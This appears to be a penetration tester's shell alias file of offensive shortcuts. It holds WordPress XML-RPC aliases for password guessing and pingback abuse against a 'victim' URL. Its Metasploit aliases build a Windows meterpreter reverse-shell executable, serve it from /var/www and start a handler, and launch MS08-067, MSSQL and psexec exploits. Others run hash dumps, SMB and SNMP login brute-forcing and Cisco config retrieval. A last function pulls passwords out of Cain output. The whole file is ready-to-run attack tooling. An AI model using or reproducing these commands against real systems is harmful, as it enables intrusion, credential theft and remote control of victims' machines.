# Wordpress
alias cwlogin='curl -D - -H "Content-Type: text/xml" -A "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)" -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>admin</string></value></param><param><value><string>password</string></value></param></params></methodCall>" --ignore-content-length'
alias cwping=' curl -D - -H "Content-Type: text/xml" -A "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)" -d "<methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://www.google.com/</string></value></param><param><value><string>http://victim/?p=1</string></value></param></params></methodCall>" --ignore-content-length'

# Networking
alias netrestart='service networking stop && ifconfig eth0 up && service networking start'

# Metasploit
alias msfexe='msfvenom -p windows/meterpreter/reverse_tcp LHOST=`ifconfig -a | grep "Bcast" | cut -d ":" -f2 | cut -d " " -f 1` LPORT=443 -f exe > msf.exe && mv msf.exe /var/www && echo "msf.exe created and moved in /var/www/"'
alias msfhandler='echo "use exploit/multi/handler" > /tmp/handler.rc && echo "set LHOST 0.0.0.0" >> /tmp/handler.rc && echo "set LPORT 443" >> /tmp/handler.rc && echo "set ExitOnSession false" >> /tmp/handler.rc && echo "exploit -j" >> /tmp/handler.rc && msfconsole -r /tmp/handler.rc'
alias msfms08_67='echo "use exploit/windows/smb/ms08_067_netapi" > /tmp/handler.rc && echo "set payload windows/meterpreter/reverse_tcp" >> /tmp/handler.rc && echo "set LHOST `ifconfig -a | grep "Bcast" | cut -d ":" -f2 | cut -d " " -f 1`" >> /tmp/handler.rc && echo "set ExitOnSession false" >> /tmp/handler.rc && echo "show options" >> /tmp/handler.rc && msfconsole -r /tmp/handler.rc'
alias msfmssql_shell='echo "use exploit/windows/mssql/mssql_payload" > /tmp/handler.rc && echo "set payload windows/meterpreter/reverse_tcp" >> /tmp/handler.rc && echo "set LHOST `ifconfig -a | grep "Bcast" | cut -d ":" -f2 | cut -d " " -f 1`" >> /tmp/handler.rc && echo "set ExitOnSession false" >> /tmp/handler.rc && echo "show options" >> /tmp/handler.rc && msfconsole -r /tmp/handler.rc'
alias msfmssql_hashdump='echo "use auxiliary/scanner/mssql/mssql_hashdump" > /tmp/handler.rc && echo "show options" >> /tmp/handler.rc && msfconsole -r /tmp/handler.rc'
alias msfmssql_exec='echo "use auxiliary/admin/mssql/mssql_exec" > /tmp/handler.rc && echo "show options" >> /tmp/handler.rc && msfconsole -r /tmp/handler.rc'
alias msfmssql_query='echo "use auxiliary/admin/mssql/mssql_sql" > /tmp/handler.rc && echo "show options" >> /tmp/handler.rc && msfconsole -r /tmp/handler.rc'
alias msfmysql_query='echo "use auxiliary/admin/mysql/mysql_sql" > /tmp/handler.rc && echo "show options" >> /tmp/handler.rc && msfconsole -r /tmp/handler.rc'
alias msfmysql_hashdump='echo "use auxiliary/scanner/mysql/mysql_hashdump" > /tmp/handler.rc && echo "show options" >> /tmp/handler.rc && msfconsole -r /tmp/handler.rc'
alias msfsmb_login='echo "use auxiliary/scanner/smb/smb_login" > /tmp/handler.rc && echo "show options" >> /tmp/handler.rc && msfconsole -r /tmp/handler.rc'
alias msfsnmp_login='echo "use auxiliary/scanner/snmp/snmp_login" > /tmp/handler.rc && echo "show options" >> /tmp/handler.rc && msfconsole -r /tmp/handler.rc'
alias msfsnmp_cisco_config_tftp='echo "use auxiliary/scanner/snmp/cisco_config_tftp" > /tmp/handler.rc && echo "show options" >> /tmp/handler.rc && msfconsole -r /tmp/handler.rc'
alias msfpsexec='echo "use exploit/windows/smb/psexec" > /tmp/handler.rc && echo "set payload windows/meterpreter/reverse_tcp" >> /tmp/handler.rc && echo "set LHOST `ifconfig -a | grep "Bcast" | cut -d ":" -f2 | cut -d " " -f 1`" >> /tmp/handler.rc && echo "set ExitOnSession false" >> /tmp/handler.rc && echo "show options" >> /tmp/handler.rc && msfconsole -r /tmp/handler.rc'

# Cain
cainpass () { cut -d$'\t' -f4 $1 | grep -v '^$' | grep -v '* empty *'; }
